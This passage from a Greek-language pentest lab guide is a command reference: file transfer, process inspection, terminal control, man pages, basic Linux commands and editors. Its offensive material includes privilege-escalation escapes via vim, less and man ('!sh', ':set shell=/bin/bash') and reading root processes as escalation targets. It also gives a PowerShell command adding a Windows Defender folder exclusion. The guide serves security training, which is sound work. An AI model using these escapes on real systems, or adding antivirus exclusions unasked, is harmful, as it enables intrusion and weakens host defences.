| `sort -u` | ταξινόμηση και αφαίρεση διπλοτύπων · `sort -u -o FILE FILE` γράφει πίσω με ασφάλεια |
| `uniq -c` | μέτρησε συνεχόμενα διπλότυπα (θέλει ταξινομημένη είσοδο) |
| `tr ' ' '\n'` | μετάφραση χαρακτήρων — εδώ κενά σε newlines |
| `cut -d: -f1` | χώρισε στο `:` και τύπωσε το πεδίο 1 — `cut -d: -f1 /etc/passwd` λίστα χρηστών |
| `awk '{print $1}'` | τύπωσε την πρώτη στήλη· `awk -F: '{print $1}'` ορίζει διαχωριστή |
| `tee FILE` | γράψε σε αρχείο **και** στην οθόνη |
| `python3 -m http.server 8000` | ένας πλήρης static file server για τον τρέχοντα κατάλογο. Η γραμμή `CLIENT - - [time] "GET /path HTTP/1.1" 200 -` είναι η απόδειξη ότι ο στόχος πήρε το αρχείο |
| `wget URL -O FILE` | λήψη σε ονομασμένο αρχείο. `-r` mirror, `-q` quiet |
| `curl -o FILE URL` | το ίδιο με curl· `-O` χρησιμοποιεί το απομακρυσμένο όνομα |
| `base64 -w 0` | κωδικοποίηση **χωρίς αναδίπλωση** — απαραίτητο όταν το αποτέλεσμα πάει σε URL ή σε μία γραμμή |

**`printf '%s'` αντί `echo`.** Το `echo 'x' | base64` κωδικοποιεί ένα τελικό newline, άρα η
αποκωδικοποίηση δίνει μια παραπάνω κενή γραμμή και οι byte-ακριβείς συγκρίσεις αποτυγχάνουν. Το
`printf '%s' 'x'` γράφει **ακριβώς** τα bytes που ζητήσατε. Χρησιμοποιείτε `echo` για ανάγνωση·
`printf` για ό,τι θα συγκρίνετε ή θα στείλετε.

**Επαληθεύετε κάθε μεταφορά:**

```bash
md5sum linpeas.sh          # και στα δύο μηχανήματα· ίδια έξοδος = ακέραιο αρχείο
```

Ένα κολοβό download παράγει σφάλμα `gcc` ή `bash: syntax error` που **μοιάζει** με bug του
εργαλείου. Η σύγκριση checksums παίρνει δύο δευτερόλεπτα και εξαλείφει μια ολόκληρη κατηγορία
φαντασμάτων.

### 9.7 Διεργασίες και προσανατολισμός

```bash
ps aux | head
ps -ef | grep apache
whoami
hostname
ip -br a
stty size
uname -a
```

```text
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1  18084  2944 ?        Ss   09:12   0:01 /sbin/init
root         402  0.0  0.2  78432  5632 ?        Ss   09:12   0:00 /usr/sbin/sshd -D
www-data     811  0.3  1.1 234560 11264 ?        S    09:13   0:04 /usr/sbin/apache2 -k start
root        1204  0.0  0.0   4628   812 ?        S    09:15   0:00 /bin/sh -c /opt/md5check.py
```

| Στήλη | Σημασία |
| --- | --- |
| `USER` | **ποιος κατέχει τη διεργασία** — η στήλη που μετράει περισσότερο για αναβάθμιση |
| `PID` | αναγνωριστικό· `1` είναι πάντα το `init`/`systemd`, ο πρόγονος όλων |
| `%CPU` / `%MEM` | τρέχουσα κατανάλωση |
| `VSZ` / `RSS` | εικονικό μέγεθος και **resident** (πραγματικά στη RAM), σε KB |
| `TTY` | το τερματικό ελέγχου. **`?` = κανένα** — daemon, ή κέλυφος χωρίς PTY |
| `STAT` | `S` sleeping, `R` running, `Z` zombie, `s` session leader, `+` foreground |
| `COMMAND` | η πλήρης γραμμή εντολής, με ορίσματα |

**Διαβάστε τη στήλη `USER` ως χάρτη των ορίων εμπιστοσύνης του μηχανήματος.** Ο `www-data` που τρέχει
`apache2` λέει ότι μια web παραβίαση σας πάει εκεί και όχι ψηλότερα. Ο `root` που τρέχει
`/bin/sh -c /opt/md5check.py` είναι η γραμμή που κερδίζει το Μηχάνημα 9 — root διεργασία που εκτελεί
script που μπορεί να μπορείτε να ξαναγράψετε.

Το `ps` είναι **στιγμιότυπο**: δείχνει τι υπάρχει τη στιγμή που το τρέχετε. Μια εργασία που τρέχει
200 ms κάθε πέντε δευτερόλεπτα σχεδόν ποτέ δεν θα εμφανιστεί. Γι' αυτό υπάρχει το `pspy` (Κεφάλαιο 05).

Το `stty size` τυπώνει `rows cols` για το τρέχον τερματικό — καταγράψτε το *πριν* αναβαθμίσετε ένα
κέλυφος σε raw mode, ώστε να ορίσετε το απομακρυσμένο να ταιριάζει.

### 9.8 Έλεγχος εργασιών και επισκευή τερματικού

| Πλήκτρα / εντολή | Τι συμβαίνει |
| --- | --- |
| `Ctrl+C` | SIGINT στη διεργασία προσκηνίου — «σταμάτα σε παρακαλώ» |
| `Ctrl+Z` | SIGTSTP — **αναστολή**. Μένει ζωντανή στο παρασκήνιο |
| `jobs` | λίστα ανεσταλμένων/παρασκηνίου, αριθμημένες `[1]`, `[2]` |
| `fg` / `bg` | φέρε την εργασία 1 στο προσκήνιο / συνέχισε στο παρασκήνιο. `fg %2` επιλέγει την 2 |
| `Ctrl+D` | end-of-file στο stdin — βγαίνει από κέλυφος, `ftp`/`mysql`/`psql` prompt, ή `nc` |
| `Ctrl+L` | καθαρισμός οθόνης (ίδιο με `clear`) |
| `Ctrl+R` | **αναζήτηση ιστορικού** προς τα πίσω. Γράψε μέρος της εντολής· Enter την τρέχει, `→` την επεξεργάζεται |
| `Ctrl+A` / `Ctrl+E` | αρχή / τέλος γραμμής |
| `Ctrl+U` / `Ctrl+K` | διαγραφή πριν / μετά τον κέρσορα |
| `Ctrl+W` | διαγραφή της λέξης πριν τον κέρσορα |
| `Tab` | συμπλήρωση ονόματος αρχείου/εντολής. **Δύο φορές** = λίστα υποψηφίων |
| `!!` | η προηγούμενη εντολή — `sudo !!` την ξανατρέχει με sudo |
| `reset` | επαναφορά τερματικού. **Πληκτρολογήστε το στα τυφλά και Enter** όταν η οθόνη είναι χάλια ή το echo κλειστό |
| `stty sane` | επαναφορά κανονικών ρυθμίσεων χωρίς καθαρισμό οθόνης |
| `history \| tail -20` | οι τελευταίες 20 εντολές — και πού βρίσκονται οι κωδικοί σας, αν τους πληκτρολογήσατε σε γραμμή εντολής |

Το `Ctrl+C` που σκοτώνει τον listener `nc` στη μέση του εργαστηρίου δεν είναι μυστήριο: πριν την
αναβάθμιση TTY, ο **τοπικός** driver τερματικού μετατρέπει το `Ctrl+C` σε SIGINT για την τοπική
διεργασία προσκηνίου, που είναι το `nc`. Το Κεφάλαιο 06 εξηγεί τη λύση (`stty raw -echo`).

### 9.9 Βοήθεια — τα τρία επίπεδα

```bash
nmap --help              # 1. σύντομη σύνοψη των πιο συνηθισμένων επιλογών
man nmap                 # 2. το πλήρες manual.  /αναζήτηση, n επόμενο, q έξοδος
man 5 passwd             # 3. συγκεκριμένη ΕΝΟΤΗΤΑ manual
sqlmap -hh               #    εργαλεία με τεράστια σύνολα επιλογών έχουν δική τους εκτεταμένη βοήθεια
tldr nmap                #    παραδείγματα κοινότητας, όπου υπάρχει
info coreutils 'ls'      #    τα δικά τους docs του GNU, πιο ενημερωμένα από μερικά man pages
```

**Οι ενότητες του `man` αξίζει να τις ξέρετε**, γιατί το ίδιο όνομα μπορεί να είναι εντολή, μορφή
αρχείου και κλήση βιβλιοθήκης: `1` εντολές χρήστη · `2` system calls · `3` συναρτήσεις βιβλιοθήκης ·
`4` αρχεία συσκευών (`man 4 null`) · **`5` μορφές αρχείων** (`man 5 passwd`, `man 5 shadow`,
`man 5 sudoers`) · `7` συμβάσεις · `8` εντολές διαχείρισης. Όταν θέλετε να μάθετε τα *πεδία* του
`/etc/passwd`, το `man 5 passwd` απαντά σε μία οθόνη — και είναι η **αυθεντική** πηγή, όχι ένα blog.

Μέσα στο `man`: πατήστε `/`, γράψτε την αναζήτηση, Enter· `n` για το επόμενο, `N` για το προηγούμενο·
`q` για έξοδο. Η αναζήτηση σε man page για μια επιλογή που θυμάστε μισή είναι γρηγορότερη από το web,
δουλεύει offline, και είναι σωστή για την έκδοση που **έχετε** εγκατεστημένη.

### 9.10 Βασικές εντολές Linux — αρχεία, κατάλογοι και επεξεργαστές

Τα εργαλεία είναι μόνο η μισή ιστορία. Η άλλη μισή είναι να **κινείστε σε ένα σύστημα αρχείων και
να επεξεργάζεστε ένα αρχείο** χωρίς να βγαίνετε από το τερματικό. Αυτές είναι οι εντολές που θα
πληκτρολογήσετε περισσότερο από οποιεσδήποτε άλλες.

**Πλοήγηση και κατάλογοι**

```bash
pwd                       # πού είμαι;
ls                        # λίστα του τρέχοντος καταλόγου
ls -la /etc               # αναλυτικά, μαζί με κρυφά αρχεία
cd /var/www/html          # αλλαγή καταλόγου
cd ..                     # πάνω ΕΝΑ επίπεδο
cd ../..                  # πάνω δύο επίπεδα
cd -                      # πίσω στον ΠΡΟΗΓΟΥΜΕΝΟ κατάλογο
cd                        # χωρίς όρισμα: πάει στο home (~)
cd ~/scans && ls          # το && τρέχει το επόμενο μόνο αν το πρώτο πέτυχε
mkdir scans               # δημιουργία καταλόγου
mkdir -p a/b/c            # -p: φτιάχνει και τους γονείς, δεν αποτυγχάνει αν υπάρχουν
```

**Δημιουργία, αντιγραφή, μετακίνηση, διαγραφή**

```bash
touch notes.md            # άδειο αρχείο (ή ενημέρωση timestamp)
echo "hello" > f.txt      # εγγραφή (αντικαθιστά το αρχείο)
echo "more"  >> f.txt     # προσάρτηση
cat > f.txt <<'EOF'       # heredoc: γράψε πολλές γραμμές, τελείωσε με γραμμή «EOF»
line one
line two
EOF
cp f.txt f.bak            # αντιγραφή αρχείου
cp -r dir/ dir.bak/       # αντιγραφή καταλόγου (-r = recursive)
mv f.txt g.txt            # ΜΕΤΟΝΟΜΑΣΙΑ (ίδιος κατάλογος)
mv f.txt /tmp/            # ΜΕΤΑΚΙΝΗΣΗ (άλλος κατάλογος)
rm f.txt                  # διαγραφή αρχείου — δεν υπάρχει undo
rm -r dir/                # διαγραφή καταλόγου και όλου του περιεχομένου
rm -f f.txt               # χωρίς ερώτηση
```

> **Το `mv` είναι «μετονομασία Ή μετακίνηση» — ίδια εντολή.** Και το **`rm` δεν έχει κάδο
> ανακύκλωσης**: σε πραγματικό έργο, διαγράφοντας λάθος αρχείο καταστρέφετε αποδεικτικά στοιχεία.
> Πριν από κάθε `rm -r`, τρέξτε `ls` στην ίδια διαδρομή. (Γι' αυτό άλλωστε παίρνετε **snapshots** — §2.)

**Ανάγνωση και επεξεργασία**

```bash
cat /etc/hostname         # τύπωσε ένα (σύντομο) αρχείο
less /etc/passwd          # σελιδοποίηση: /αναζήτηση, n επόμενο, G τέλος, q έξοδος
nano notes.md             # ο φιλικός editor — δείτε τα πλήκτρα παρακάτω
vim notes.md              # ο «επαγγελματικός» — δείτε το survival kit παρακάτω
```

**`nano`** — το φιλικό. Το `^` στο κάτω μέρος σημαίνει `Ctrl`:

| Πλήκτρα | Ενέργεια |
| --- | --- |
| `Ctrl+O`, Enter | **αποθήκευση** (Write Out) |
| `Ctrl+X` | **έξοδος** (ρωτά να αποθηκεύσει αν άλλαξες κάτι) |
| `Ctrl+W` | αναζήτηση |
| `Ctrl+K` / `Ctrl+U` | κόψε την τρέχουσα γραμμή / επικόλλησέ την |

**`vim`** — υπάρχει παντού και δεν φεύγει, άρα μάθε το **survival kit**· με αυτά κάνετε το 95% της δουλειάς:

| Πλήκτρα | Ενέργεια |
| --- | --- |
| `i` | λειτουργία **insert** (γράψε). Το `Esc` επιστρέφει σε normal mode |
| `Esc` | βγες από insert mode (πριν από κάθε εντολή με `:`) |
| `:w` | αποθήκευση |
| `:q` | έξοδος |
| `:wq` ή `:x` | αποθήκευση **και** έξοδος |
| `:q!` | έξοδος **χωρίς** αποθήκευση |
| `/λέξη` + Enter | αναζήτηση· `n` επόμενο, `N` προηγούμενο |
| `dd` | διαγραφή γραμμής · `u` undo · `gg` αρχή · `G` τέλος |

> **Γιατί το `vim` μετράει πέρα από την επεξεργασία.** Είναι **primitive αναβάθμισης προνομίων**:
> αν ένα SUID binary ή ένας κανόνας `sudo` σας αφήνει να τρέξετε `vim`, τότε το `:!sh` δίνει κέλυφος
> ως ο ιδιοκτήτης του ([GTFOBins](https://gtfobins.github.io/gtfobins/vim/)). Είναι επίσης πώς
> **διαφεύγετε από το `rbash`** (Μηχάνημα 4): `:set shell=/bin/bash` και μετά `:shell`. Το ίδιο
> ισχύει για `nano` (`^R` `^X`), `less` (`!sh`) και `man` (`!sh`).

**Συνήθεια προσανατολισμού πέντε δευτερολέπτων.** Μόλις μπείτε σε νέο μηχάνημα, τρέξτε τα παρακάτω
πριν από οτιδήποτε:

```bash
id; whoami; hostname; pwd; uname -a; cat /etc/os-release
```

Λένε *ποιος είσαι*, *πού είσαι* και *τι είναι το μηχάνημα* — τα τρία πράγματα από τα οποία εξαρτάται
κάθε επόμενη απόφαση.

### 9.11 Windows / Antivirus — προστασία των αρχείων του εργαστηρίου

Αν έχετε κλωνοποιήσει αυτό το αποθετήριο σε Windows, το Windows Defender ενδέχεται να χαρακτηρίσει ψευδώς θετικά (false positive) ορισμένα εκπαιδευτικά αποσπάσματα PHP/reverse-shell μέσα στα αρχεία Markdown. Για να εξαιρέσετε τον φάκελο του αποθετηρίου (μία φορά, σε PowerShell ως Διαχειριστής) και να επαναφέρετε τυχόν αρχεία από το git:

```powershell
Add-MpPreference -ExclusionPath "C:\path\to\Cybersecurity101-Labs"
(Get-MpPreference).ExclusionPath
```

```bash
git status            # ελέγξτε αν λείπουν αρχεία
git checkout -- .     # επαναφέρετε όλα τα παρακολουθούμενα αρχεία από το git
```

Δείτε την πλήρη εξήγηση στο [`docs/LAB-SETUP.md` §10](../docs/LAB-SETUP.md#10-windows--antivirus--keep-your-lab-files-from-being-deleted) και στον [Απολογισμό Αποθετηρίου (`docs/ΑΝΑΘΕΩΡΗΣΗ.md`)](../docs/ΑΝΑΘΕΩΡΗΣΗ.md).
